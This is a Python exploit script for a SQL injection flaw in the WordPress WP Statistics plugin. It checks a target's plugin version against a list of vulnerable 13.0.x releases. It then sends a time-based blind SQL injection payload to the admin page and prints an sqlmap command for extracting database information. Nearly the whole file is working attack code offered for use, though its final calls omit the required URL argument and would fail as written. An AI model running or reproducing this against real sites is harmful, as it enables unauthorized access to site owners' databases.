import requests
from urllib.parse import urlencode, quote_plus
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re
def blindsql(url):
	url_endpoint = url + '/wp-admin/admin.php'
	ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
	sleep = 15
	payload="ID=1 AND (SELECT * from (select SLEEP(%s))a)"%(sleep)
	url_encode = urlencode({'page':'wps_pages_page', 'type':'1', 'ID':payload}, quote_via=quote_plus)
	try:
		#print(url_endpoint +'?'+ url_encode)
		print('(+) Try payload')
		r = requests.get(url_endpoint +'?'+ url_encode, timeout=5, verify=False).status_code
		print('(!) Target seem like not timeout!')
		print(r)
		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
		return True
	except (requests.ConnectTimeout, requests.exceptions.ReadTimeout):
		print('(+) WwoowowoW maybe vuln ;)')
		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
		return True
def exploit(url):
	curl = url + '/wp-content/plugins/wp-statistics/readme.txt'
	try:
		cver = requests.get(curl,headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36'}, timeout=10, verify=False).text
		stable_ver = re.findall('Stable tag\:(.*)', cver)[0].replace(' ', '')
		print("(+) WP-statistical Plugin Version = " + stable_ver)
		vuln = ["13.0.7", "13.0.6", "13.0.5", "13.0.4", "13.0.3", "13.0.1", "13.0"]
		is_vuln = False
		for v in vuln:
			if v in stable_ver:
				is_vuln = True
		if is_vuln:
			print("(+) %s Target is vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
			return True
		else:
			print("(-) %s Target is not vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
			exit()
	except:
		print("(-) WP-statistical Unable to detect version.")
		exit()
import sys
exploit()
blindsql()
#follow me: tw@lotusdll () now put your author on this script ;)
